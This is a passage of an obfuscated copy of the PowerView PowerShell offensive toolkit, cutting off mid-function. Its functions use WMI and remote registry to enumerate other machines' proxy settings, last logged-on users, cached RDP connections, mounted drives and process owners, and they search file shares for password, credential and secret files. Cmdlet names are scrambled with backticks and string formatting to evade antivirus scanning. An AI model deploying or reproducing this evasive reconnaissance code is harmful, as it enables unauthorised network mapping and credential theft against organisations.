Get-WMIRegProxy

ComputerName           ProxyServer            AutoConfigURL         Wpad
------------           -----------            -------------         ----
WINDOWS1               http://primary.test...

.EXAMPLE

$Cred = Get-Credential "TESTLAB\administrator"
Get-WMIRegProxy -Credential $Cred -ComputerName primary.testlab.local

ComputerName            ProxyServer            AutoConfigURL         Wpad
------------            -----------            -------------         ----
windows1.testlab.local  primary.testlab.local

.INPUTS

String

Accepts one or more computer name specification strings  on the pipeline (netbios or FQDN).

.OUTPUTS

PowerView.ProxySettings

Outputs custom PSObjects with the ComputerName, ProxyServer, AutoConfigURL, and WPAD contents.
#>

    [OutputType('PowerView.ProxySettings')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${T`RUE}, ValueFromPipelineByPropertyName = ${tr`UE})]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${coM`PuTe`RnA`Me} = ${EN`V:Comp`UtERn`Ame},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`REde`Nt`Ial} = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach (${c`O`MPuTeR} in ${COmpU`TeR`NamE}) {
            try {
                ${Wmi`AR`GUmeN`TS} = @{
                    'List' = ${T`RUe}
                    'Class' = 'StdRegProv'
                    'Namespace' = 'root\default'
                    'Computername' = ${COm`P`UteR}
                    'ErrorAction' = 'Stop'
                }
                if (${P`sB`Oun`DPaRa`mEt`ErS}['Credential']) { ${wmi`A`RgUMEn`Ts}['Credential'] = ${crE`D`EN`TiaL} }

                ${R`EGP`ROVIdER} = &("{1}{0}{2}" -f'b','Get-WmiO','ject') @WmiArguments
                ${k`EY} = 'SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings'

                # HKEY_CURRENT_USER
                ${H`KcU} = 2147483649
                ${prO`x`ySErv`eR} = ${rEGp`Rov`i`der}.GetStringValue(${h`Kcu}, ${k`eY}, 'ProxyServer').sValue
                ${aU`T`oconf`IGU`RL} = ${rEgPRo`Vi`der}.GetStringValue(${hK`Cu}, ${K`eY}, 'AutoConfigURL').sValue

                ${W`pAd} = ''
                if (${AuT`O`CONf`iG`UrL} -and (${autoCo`NFI`g`URl} -ne '')) {
                    try {
                        ${w`Pad} = (&("{1}{2}{0}{3}"-f 'c','New-Ob','je','t') ("{3}{2}{1}{0}"-f'bClient','.We','t','Ne')).DownloadString(${AU`T`O`cOn`FIguRl})
                    }
                    catch {
                        &("{2}{1}{0}" -f 'Warning','-','Write') "[Get-WMIRegProxy] Error connecting to AutoConfigURL : $AutoConfigURL"
                    }
                }

                if (${P`ROxYs`erVeR} -or ${aUT`oCONfI`G`UrL}) {
                    ${O`UT} = &("{1}{2}{0}"-f 'ect','New-','Obj') ("{2}{1}{0}" -f 't','ec','PSObj')
                    ${o`UT} | &("{0}{2}{1}"-f 'A','er','dd-Memb') ("{0}{1}{2}"-f'Notepr','oper','ty') 'ComputerName' ${cO`M`PutEr}
                    ${o`Ut} | &("{2}{3}{1}{0}" -f'er','emb','Add','-M') ("{1}{0}{3}{2}"-f'pro','Note','ty','per') 'ProxyServer' ${p`ROXYS`e`RveR}
                    ${O`Ut} | &("{2}{0}{1}" -f '-Memb','er','Add') ("{3}{1}{0}{2}" -f 'ope','epr','rty','Not') 'AutoConfigURL' ${AutOc`O`Nf`iGuRl}
                    ${O`UT} | &("{1}{0}{2}"-f'd-M','Ad','ember') ("{1}{0}{2}"-f 'teprope','No','rty') 'Wpad' ${WP`AD}
                    ${o`UT}.PSObject.TypeNames.Insert(0, 'PowerView.ProxySettings')
                    ${o`Ut}
                }
                else {
                    &("{1}{3}{0}{2}{4}"-f'arn','Writ','i','e-W','ng') "[Get-WMIRegProxy] No proxy settings found for $ComputerName"
                }
            }
            catch {
                &("{2}{0}{1}" -f'te-Wa','rning','Wri') "[Get-WMIRegProxy] Error enumerating proxy settings for $ComputerName : $_"
            }
        }
    }
}


function gEt-`wMIrEGL`A`S`TLoGG`eD`oN {
<#
.SYNOPSIS

Returns the last user who logged onto the local (or a remote) machine.

Note: This function requires administrative rights on the machine you're enumerating.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

This function uses remote registry to enumerate the LastLoggedOnUser registry key
for the local (or remote) machine.

.PARAMETER ComputerName

Specifies the hostname to query for remote registry values (also accepts IP addresses).
Defaults to 'localhost'.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connecting to the remote system.

.EXAMPLE

Get-WMIRegLastLoggedOn

Returns the last user logged onto the local machine.

.EXAMPLE

Get-WMIRegLastLoggedOn -ComputerName WINDOWS1

Returns the last user logged onto WINDOWS1

.EXAMPLE

Get-DomainComputer | Get-WMIRegLastLoggedOn

Returns the last user logged onto all machines in the domain.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-WMIRegLastLoggedOn -ComputerName PRIMARY.testlab.local -Credential $Cred

.OUTPUTS

PowerView.LastLoggedOnUser

A PSCustomObject containing the ComputerName and last loggedon user.
#>

    [OutputType('PowerView.LastLoggedOnUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${tr`Ue}, ValueFromPipelineByPropertyName = ${t`RUe})]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${c`O`MpUT`ERNA`ME} = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cRedE`Nt`ial} = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach (${cO`MPUTeR} in ${C`OMPUtEr`NaME}) {
            # HKEY_LOCAL_MACHINE
            ${HK`lM} = 2147483650

            ${w`miaRG`Um`eNtS} = @{
                'List' = ${T`RUe}
                'Class' = 'StdRegProv'
                'Namespace' = 'root\default'
                'Computername' = ${C`ompUT`Er}
                'ErrorAction' = 'SilentlyContinue'
            }
            if (${psb`ouNDPaR`A`me`TE`Rs}['Credential']) { ${wm`I`ArgUmEnts}['Credential'] = ${cR`E`DeNtiaL} }

            # try to open up the remote registry key to grab the last logged on user
            try {
                ${R`eg} = &("{2}{1}{0}{3}" -f 'c','bje','Get-WmiO','t') @WmiArguments

                ${K`Ey} = 'SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI'
                ${V`Alue} = 'LastLoggedOnUser'
                ${l`AsTU`sEr} = ${r`EG}.GetStringValue(${hK`lm}, ${K`Ey}, ${Va`Lue}).sValue

                ${LA`STL`ogGEDon} = &("{2}{1}{0}{3}" -f'j','Ob','New-','ect') ("{1}{2}{0}" -f'bject','PS','O')
                ${L`ASTlO`ggeDON} | &("{1}{0}{2}"-f 'e','Add-Memb','r') ("{2}{1}{0}{3}" -f 'tep','o','N','roperty') 'ComputerName' ${c`OMpUtER}
                ${L`ASt`log`g`Edon} | &("{0}{1}{3}{2}" -f'Add','-Me','r','mbe') ("{1}{2}{0}"-f'erty','Notepro','p') 'LastLoggedOn' ${lAsT`Us`er}
                ${L`ASTlOg`G`ed`On}.PSObject.TypeNames.Insert(0, 'PowerView.LastLoggedOnUser')
                ${las`TL`Og`gEDON}
            }
            catch {
                &("{0}{1}{2}" -f'Wr','ite-War','ning') "[Get-WMIRegLastLoggedOn] Error opening remote registry on $Computer. Remote registry likely not enabled."
            }
        }
    }
}


function G`et-Wm`ire`GcAcheD`RdPC`onNE`cTIOn {
<#
.SYNOPSIS

Returns information about RDP connections outgoing from the local (or remote) machine.

Note: This function requires administrative rights on the machine you're enumerating.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: ConvertFrom-SID  

.DESCRIPTION

Uses remote registry functionality to query all entries for the
"Windows Remote Desktop Connection Client" on a machine, separated by
user and target server.

.PARAMETER ComputerName

Specifies the hostname to query for cached RDP connections (also accepts IP addresses).
Defaults to 'localhost'.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connecting to the remote system.

.EXAMPLE

Get-WMIRegCachedRDPConnection

Returns the RDP connection client information for the local machine.

.EXAMPLE

Get-WMIRegCachedRDPConnection  -ComputerName WINDOWS2.testlab.local

Returns the RDP connection client information for the WINDOWS2.testlab.local machine

.EXAMPLE

Get-DomainComputer | Get-WMIRegCachedRDPConnection

Returns cached RDP information for all machines in the domain.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-WMIRegCachedRDPConnection -ComputerName PRIMARY.testlab.local -Credential $Cred

.OUTPUTS

PowerView.CachedRDPConnection

A PSCustomObject containing the ComputerName and cached RDP information.
#>

    [OutputType('PowerView.CachedRDPConnection')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${t`RUe}, ValueFromPipelineByPropertyName = ${T`Rue})]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${coMP`Ut`E`Rn`AmE} = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`RE`de`NTIal} = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach (${CoMp`Ut`eR} in ${c`O`mpuTerNamE}) {
            # HKEY_USERS
            ${H`Ku} = 2147483651

            ${wM`I`ArGuM`enTS} = @{
                'List' = ${TR`Ue}
                'Class' = 'StdRegProv'
                'Namespace' = 'root\default'
                'Computername' = ${cOmp`U`Ter}
                'ErrorAction' = 'Stop'
            }
            if (${Psb`oUnD`pArAME`TErs}['Credential']) { ${wMIAr`GUM`eNts}['Credential'] = ${C`REDeN`T`iAl} }

            try {
                ${R`eG} = &("{3}{2}{1}{0}" -f'bject','O','t-Wmi','Ge') @WmiArguments

                # extract out the SIDs of domain users in this hive
                ${us`E`RSIds} = (${R`eg}.EnumKey(${H`KU}, '')).sNames | &("{2}{0}{1}"-f'Ob','ject','Where-') { ${_} -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' }

                ForEach (${Users`iD} in ${Us`erSI`ds}) {
                    try {
                        if (${P`sbo`U`NdPARAmE`Ters}['Credential']) {
                            ${usER`NA`ME} = &("{4}{2}{1}{0}{3}"-f'm-','tFro','r','SID','Conve') -ObjectSid ${usEr`Sid} -Credential ${C`RE`de`NTIal}
                        }
                        else {
                            ${uS`eRN`AMe} = &("{0}{2}{1}"-f 'Conv','SID','ertFrom-') -ObjectSid ${USERs`iD}
                        }

                        # pull out all the cached RDP connections
                        ${CONnEcT`ion`ke`YS} = ${r`eG}.EnumValues(${H`ku},"$UserSID\Software\Microsoft\Terminal Server Client\Default").sNames

                        ForEach (${cOn`N`ectioN} in ${C`oN`NecTi`ONKe`ys}) {
                            # make sure this key is a cached connection
                            if (${COnnEC`T`ioN} -match 'MRU.*') {
                                ${t`AR`Get`SerVEr} = ${r`EG}.GetStringValue(${h`ku}, "$UserSID\Software\Microsoft\Terminal Server Client\Default", ${cO`NneC`TIoN}).sValue

                                ${FOuNDcO`NnE`cT`iON} = &("{1}{2}{0}" -f'ct','New-Ob','je') ("{0}{1}"-f'PSO','bject')
                                ${fo`UN`DCON`Nection} | &("{0}{2}{1}" -f'Add','ber','-Mem') ("{3}{0}{2}{1}"-f 'p','rty','e','Notepro') 'ComputerName' ${cOmpU`TER}
                                ${f`o`U`N`DcOnn`Ection} | &("{2}{0}{1}" -f'-Me','mber','Add') ("{3}{0}{1}{2}" -f 'pr','oper','ty','Note') 'UserName' ${USe`RNA`Me}
                                ${fo`UnD`connE`Cti`ON} | &("{0}{1}{2}"-f'Add-Mem','b','er') ("{0}{2}{1}"-f 'Note','operty','pr') 'UserSID' ${usE`Rs`ID}
                                ${FO`U`N`dcOnnECTI`on} | &("{0}{2}{1}"-f'Ad','er','d-Memb') ("{3}{2}{1}{0}"-f 'y','rt','pe','Notepro') 'TargetServer' ${TA`R`gEt`SeRVER}
                                ${FouNdc`onNEc`T`iON} | &("{0}{1}{2}"-f 'A','dd-','Member') ("{0}{2}{1}" -f 'Noteprop','ty','er') 'UsernameHint' ${N`UlL}
                                ${foUn`D`co`NnEct`ioN}.PSObject.TypeNames.Insert(0, 'PowerView.CachedRDPConnection')
                                ${foUN`dcon`Ne`Cti`oN}
                            }
                        }

                        # pull out all the cached server info with username hints
                        ${S`ERVE`RKeyS} = ${r`Eg}.EnumKey(${h`ku},"$UserSID\Software\Microsoft\Terminal Server Client\Servers").sNames

                        ForEach (${sE`RVER} in ${SeRVE`R`k`Eys}) {

                            ${usE`R`NAmeh`INt} = ${R`eG}.GetStringValue(${H`ku}, "$UserSID\Software\Microsoft\Terminal Server Client\Servers\$Server", 'UsernameHint').sValue

                            ${FoUndcoNnE`CT`I`On} = &("{1}{3}{2}{0}" -f'ject','New-','b','O') ("{1}{2}{0}" -f 'ct','PSObj','e')
                            ${F`oU`ND`COnNeCti`On} | &("{1}{2}{0}" -f 'er','Add-Me','mb') ("{2}{0}{1}"-f'rope','rty','Notep') 'ComputerName' ${ComP`U`TeR}
                            ${f`O`UNdCO`NNeCT`ion} | &("{3}{0}{2}{1}"-f'-M','er','emb','Add') ("{2}{1}{0}"-f 'erty','oteprop','N') 'UserName' ${useRn`A`mE}
                            ${fO`U`NdcOnnEC`TI`ON} | &("{2}{1}{0}" -f'er','-Memb','Add') ("{0}{1}{2}"-f 'Not','eprop','erty') 'UserSID' ${USE`R`Sid}
                            ${fou`ND`co`N`NeCTIoN} | &("{0}{1}{2}" -f'A','dd-Membe','r') ("{2}{0}{1}"-f'prope','rty','Note') 'TargetServer' ${SEr`VEr}
                            ${FOU`N`dCO`NneCT`I`ON} | &("{1}{0}{2}"-f 'Memb','Add-','er') ("{2}{1}{0}" -f'perty','ro','Notep') 'UsernameHint' ${u`SerN`A`MeH`INt}
                            ${FO`UNdc`on`NEcTi`ON}.PSObject.TypeNames.Insert(0, 'PowerView.CachedRDPConnection')
                            ${FOunDcoNneC`T`ion}
                        }
                    }
                    catch {
                        &("{4}{1}{3}{0}{2}"-f '-Ver','rit','bose','e','W') "[Get-WMIRegCachedRDPConnection] Error: $_"
                    }
                }
            }
            catch {
                &("{0}{2}{1}{3}" -f'W','in','rite-Warn','g') "[Get-WMIRegCachedRDPConnection] Error accessing $Computer, likely insufficient permissions or firewall rules on host: $_"
            }
        }
    }
}


function get-`WmIre`G`MounTed`DrI`Ve {
<#
.SYNOPSIS

Returns information about saved network mounted drives for the local (or remote) machine.

Note: This function requires administrative rights on the machine you're enumerating.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: ConvertFrom-SID  

.DESCRIPTION

Uses remote registry functionality to enumerate recently mounted network drives.

.PARAMETER ComputerName

Specifies the hostname to query for mounted drive information (also accepts IP addresses).
Defaults to 'localhost'.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connecting to the remote system.

.EXAMPLE

Get-WMIRegMountedDrive

Returns the saved network mounted drives for the local machine.

.EXAMPLE

Get-WMIRegMountedDrive -ComputerName WINDOWS2.testlab.local

Returns the saved network mounted drives for the WINDOWS2.testlab.local machine

.EXAMPLE

Get-DomainComputer | Get-WMIRegMountedDrive

Returns the saved network mounted drives for all machines in the domain.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-WMIRegMountedDrive -ComputerName PRIMARY.testlab.local -Credential $Cred

.OUTPUTS

PowerView.RegMountedDrive

A PSCustomObject containing the ComputerName and mounted drive information.
#>

    [OutputType('PowerView.RegMountedDrive')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${t`RuE}, ValueFromPipelineByPropertyName = ${tr`UE})]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${CoMp`UTERNa`Me} = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`RE`d`eNTIAL} = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach (${c`om`pUTEr} in ${C`O`MPutE`RNAme}) {
            # HKEY_USERS
            ${H`KU} = 2147483651

            ${wMiArg`UME`N`TS} = @{
                'List' = ${t`RUe}
                'Class' = 'StdRegProv'
                'Namespace' = 'root\default'
                'Computername' = ${c`O`mPUtEr}
                'ErrorAction' = 'Stop'
            }
            if (${Psb`OU`N`DPAr`AMe`TErS}['Credential']) { ${wMiARgUM`E`Nts}['Credential'] = ${cReDe`N`TiaL} }

            try {
                ${r`EG} = &("{3}{0}{2}{1}"-f'et-Wmi','ct','Obje','G') @WmiArguments

                # extract out the SIDs of domain users in this hive
                ${uSE`R`sIdS} = (${r`EG}.EnumKey(${h`Ku}, '')).sNames | &("{1}{2}{0}"-f 're-Object','Wh','e') { ${_} -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' }

                ForEach (${User`S`ID} in ${u`sErSiDS}) {
                    try {
                        if (${P`sboU`NDP`ARaMETE`Rs}['Credential']) {
                            ${useR`Na`ME} = &("{2}{1}{0}{3}" -f'rtF','ve','Con','rom-SID') -ObjectSid ${U`sers`Id} -Credential ${Cr`Ed`EnTIaL}
                        }
                        else {
                            ${US`ERna`me} = &("{1}{2}{3}{0}" -f'om-SID','Convert','F','r') -ObjectSid ${u`SeRs`ID}
                        }

                        ${d`R`iVeLetteRs} = (${r`eG}.EnumKey(${H`KU}, "$UserSID\Network")).sNames

                        ForEach (${driv`eLe`TT`eR} in ${d`R`ivEleTTerS}) {
                            ${P`Rov`IdErNAME} = ${r`EG}.GetStringValue(${H`KU}, "$UserSID\Network\$DriveLetter", 'ProviderName').sValue
                            ${rEMoTeP`A`TH} = ${R`Eg}.GetStringValue(${h`kU}, "$UserSID\Network\$DriveLetter", 'RemotePath').sValue
                            ${DRIv`EU`se`RN`Ame} = ${R`Eg}.GetStringValue(${h`Ku}, "$UserSID\Network\$DriveLetter", 'UserName').sValue
                            if (-not ${useR`NA`mE}) { ${US`erN`AMe} = '' }

                            if (${rEMot`E`PAtH} -and (${REmot`EP`ATH} -ne '')) {
                                ${mOun`TeDd`R`iVe} = &("{2}{1}{0}"-f'bject','ew-O','N') ("{0}{1}"-f'PS','Object')
                                ${mOu`Nte`ddRiVe} | &("{1}{0}{2}" -f'-Mem','Add','ber') ("{2}{1}{0}" -f'roperty','ep','Not') 'ComputerName' ${Co`m`PUteR}
                                ${mo`Un`TeDdr`IVe} | &("{1}{0}{2}"-f 'Me','Add-','mber') ("{1}{0}{3}{2}"-f 'te','No','rty','prope') 'UserName' ${uSer`NA`ME}
                                ${mo`U`NTEDdRI`Ve} | &("{1}{0}{2}"-f'-Memb','Add','er') ("{1}{3}{2}{0}"-f'ty','Not','r','eprope') 'UserSID' ${USe`R`SiD}
                                ${m`o`UNte`D`drive} | &("{2}{0}{1}"-f '-Mem','ber','Add') ("{3}{0}{1}{2}" -f 'epr','o','perty','Not') 'DriveLetter' ${d`R`iVelET`TEr}
                                ${Mou`NTEDdri`Ve} | &("{3}{0}{2}{1}" -f '-','ber','Mem','Add') ("{1}{0}{2}" -f'pro','Note','perty') 'ProviderName' ${P`R`oVIDERN`A`me}
                                ${m`OUnTeddr`IVe} | &("{0}{2}{1}{3}"-f 'Add','M','-','ember') ("{0}{1}{3}{2}" -f 'No','tepro','y','pert') 'RemotePath' ${rem`otep`A`TH}
                                ${m`oU`NtEddri`Ve} | &("{0}{1}{2}{3}" -f'Add-','Me','mb','er') ("{1}{3}{2}{0}" -f'eproperty','N','t','o') 'DriveUserName' ${D`RIV`euserNA`ME}
                                ${M`oun`TeddrIvE}.PSObject.TypeNames.Insert(0, 'PowerView.RegMountedDrive')
                                ${MoUN`TE`Dd`RiVE}
                            }
                        }
                    }
                    catch {
                        &("{0}{3}{1}{2}"-f'Write-','erbo','se','V') "[Get-WMIRegMountedDrive] Error: $_"
                    }
                }
            }
            catch {
                &("{1}{0}{2}"-f 'ite-Warn','Wr','ing') "[Get-WMIRegMountedDrive] Error accessing $Computer, likely insufficient permissions or firewall rules on host: $_"
            }
        }
    }
}


function ge`T-`wmIP`ROce`ss {
<#
.SYNOPSIS

Returns a list of processes and their owners on the local or remote machine.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

Uses Get-WMIObject to enumerate all Win32_process instances on the local or remote machine,
including the owners of the particular process.

.PARAMETER ComputerName

Specifies the hostname to query for cached RDP connections (also accepts IP addresses).
Defaults to 'localhost'.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote system.

.EXAMPLE

Get-WMIProcess -ComputerName WINDOWS1

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-WMIProcess -ComputerName PRIMARY.testlab.local -Credential $Cred

.OUTPUTS

PowerView.UserProcess

A PSCustomObject containing the remote process information.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.UserProcess')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${T`RuE}, ValueFromPipelineByPropertyName = ${T`RUe})]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${co`mP`Ute`RnamE} = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cREDE`N`T`IaL} = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach (${cOM`PuT`Er} in ${cO`MpU`TeRn`Ame}) {
            try {
                ${wmIARgUmE`N`Ts} = @{
                    'ComputerName' = ${coM`PUt`e`R`NamE}
                    'Class' = 'Win32_process'
                }
                if (${pS`BOUNdPARA`meTe`RS}['Credential']) { ${WMia`RgUmE`NtS}['Credential'] = ${Cre`Dent`IAL} }
                &("{2}{1}{0}{3}"-f 'e','t-WMIobj','Ge','ct') @WmiArguments | &("{2}{1}{0}" -f'ect','rEach-Obj','Fo') {
                    ${OWn`Er} = ${_}.getowner();
                    ${pR`OcE`ss} = &("{2}{1}{0}" -f'ect','bj','New-O') ("{2}{1}{0}"-f 'ject','Ob','PS')
                    ${P`R`ocEsS} | &("{0}{2}{3}{1}" -f'A','ember','dd','-M') ("{0}{1}{2}" -f'Not','epropert','y') 'ComputerName' ${c`omPu`Ter}
                    ${PRO`c`eSs} | &("{1}{2}{0}" -f'r','A','dd-Membe') ("{0}{1}{2}" -f 'Notep','roper','ty') 'ProcessName' ${_}.ProcessName
                    ${PrO`c`ESS} | &("{2}{3}{0}{1}"-f'be','r','Add-','Mem') ("{1}{3}{0}{2}"-f 'ope','Note','rty','pr') 'ProcessID' ${_}.ProcessID
                    ${pro`ce`sS} | &("{0}{2}{3}{1}"-f 'A','r','dd-Mem','be') ("{1}{0}{3}{2}"-f 'ote','N','operty','pr') 'Domain' ${o`w`NeR}.Domain
                    ${pROc`e`SS} | &("{0}{1}{2}"-f'Add-Mem','be','r') ("{0}{1}{2}{3}"-f'N','oteproper','t','y') 'User' ${OW`NEr}.User
                    ${P`Roce`Ss}.PSObject.TypeNames.Insert(0, 'PowerView.UserProcess')
                    ${pRoCE`Ss}
                }
            }
            catch {
                &("{2}{1}{0}" -f'-Verbose','te','Wri') "[Get-WMIProcess] Error enumerating remote processes on '$Computer', access likely denied: $_"
            }
        }
    }
}


function fi`ND-intE`RE`sTINgFIle {
<#
.SYNOPSIS

Searches for files on the given path that match a series of specified criteria.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Add-RemoteConnection, Remove-RemoteConnection  

.DESCRIPTION

This function recursively searches a given UNC path for files with
specific keywords in the name (default of pass, sensitive, secret, admin,
login and unattend*.xml). By default, hidden files/folders are included
in search results. If -Credential is passed, Add-RemoteConnection/Remove-RemoteConnection
is used to temporarily map the remote share.

.PARAMETER Path

UNC/local path to recursively search.

.PARAMETER Include

Only return files/folders that match the specified array of strings,
i.e. @(*.doc*, *.xls*, *.ppt*)

.PARAMETER LastAccessTime

Only return files with a LastAccessTime greater than this date value.

.PARAMETER LastWriteTime

Only return files with a LastWriteTime greater than this date value.

.PARAMETER CreationTime

Only return files with a CreationTime greater than this date value.

.PARAMETER OfficeDocs

Switch. Search for office documents (*.doc*, *.xls*, *.ppt*)

.PARAMETER FreshEXEs

Switch. Find .EXEs accessed within the last 7 days.

.PARAMETER ExcludeFolders

Switch. Exclude folders from the search results.

.PARAMETER ExcludeHidden

Switch. Exclude hidden files and folders from the search results.

.PARAMETER CheckWriteAccess

Switch. Only returns files the current user has write access to.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
to connect to remote systems for file enumeration.

.EXAMPLE

Find-InterestingFile -Path "C:\Backup\"

Returns any files on the local path C:\Backup\ that have the default
search term set in the title.

.EXAMPLE

Find-InterestingFile -Path "\\WINDOWS7\Users\" -LastAccessTime (Get-Date).AddDays(-7)

Returns any files on the remote path \\WINDOWS7\Users\ that have the default
search term set in the title and were accessed within the last week.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Find-InterestingFile -Credential $Cred -Path "\\PRIMARY.testlab.local\C$\Temp\"

.OUTPUTS

PowerView.FoundFile
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FoundFile')]
    [CmdletBinding(DefaultParameterSetName = 'FileSpecification')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${tr`Ue}, ValueFromPipelineByPropertyName = ${t`Rue})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${p`Ath} = '.\',

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [Alias('SearchTerms', 'Terms')]
        [String[]]
        ${In`CLUde} = @('*password*', '*sensitive*', '*admin*', '*login*', '*secret*', 'unattend*.xml', '*.vmdk', '*creds*', '*credential*', '*.config'),

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${l`As`T`A`cCeSstImE},

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${las`T`WRI`TeTImE},

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${CreaT`IO`N`TiMe},

        [Parameter(ParameterSetName = 'OfficeDocs')]
        [Switch]
        ${oFfI`c`ED`Ocs},

        [Parameter(ParameterSetName = 'FreshEXEs')]
        [Switch]
        ${FREshE`X`ES},

        [Parameter(ParameterSetName = 'FileSpecification')]
        [Switch]
        ${e`XcLudEF`OL`de`RS},

        [Parameter(ParameterSetName = 'FileSpecification')]
        [Switch]
        ${exClu`d`EhI`d`Den},

        [Switch]
        ${CHe`CkWriteA`C`c`e`SS},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`REDEn`TIal} = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        ${sEa`Rch`E`RA`Rgu`meNTs} =  @{
            'Recurse' = ${tR`Ue}
            'ErrorAction' = 'SilentlyContinue'
            'Include' = ${in`CLuDe}
        }
        if (${PsboU`NdPA`R`A`MetErS}['OfficeDocs']) {
            ${s`EAr`cHE`Ra`RG`UmEntS}['Include'] = @('*.doc', '*.docx', '*.xls', '*.xlsx', '*.ppt', '*.pptx')
        }
        elseif (${PSB`oUN`dp`AR`Am`etErS}['FreshEXEs']) {
            # find .exe's accessed within the last 7 days
            ${lasT`ACcESSTI`mE} = (&("{0}{1}{2}" -f 'Ge','t-Da','te')).AddDays(-7).ToString('MM/dd/yyyy')
            ${S`eArC`herArgu`ments}['Include'] = @('*.exe')
        }
        ${S`E`ARcherar`GumE`NTS}['Force'] = -not ${p`sBOUndPaRA`ME`TE`Rs}['ExcludeHidden']

        ${mAppEDcOM`pU`T`Ers} = @{}

        function t`esT-W`RiTE {
            # short helper to check is the current user can write to a file
            [CmdletBinding()]Param([String]${P`AtH})
            try {
                ${F`il`et`eSt} = [IO.File]::OpenWrite(${P`AtH})
                ${fi`LeTe`ST}.Close()
                ${TR`Ue}
            }
            catch {
                ${fAl`SE}
            }
        }
    }

    PROCESS {
        ForEach (${tA`Rgetp`ATH} in ${PA`TH}) {
            if ((${tA`RgETp`Ath} -Match '\\\\.*\\.*') -and (${ps`Bo`Und`Pa`RaM`eTERS}['Credential'])) {
                ${Hos`TCOM`pUtEr} = (&("{0}{2}{1}" -f'N','-Object','ew') ("{2}{0}{1}"-f 'stem.U','ri','Sy')(${TARg`ET`PAth})).Host
                if (-not ${mAP`P`eD`CoMpuT`erS}[${H`oSTcoM`Pu`TER}]) {
                    # map IPC$ to this computer if it's not already
                    &("{0}{2}{1}{3}" -f'Add-R','onnecti','emoteC','on') -ComputerName ${h`oStC`OMPut`eR} -Credential ${Cred`E`Ntial}
                    ${m`APPeDcO`MPUtE`RS}[${ho`s`Tc`OMPutER}] = ${T`RUe}
                }
            }

            ${sEar`cHeRAR`gum`EnTS}['Path'] = ${TA`R`G`ETPAtH}
            &("{2}{1}{0}" -f'ildItem','-Ch','Get') @SearcherArguments | &("{3}{0}{2}{1}"-f 'e','t','c','ForEach-Obj') {
                # check if we're excluding folders
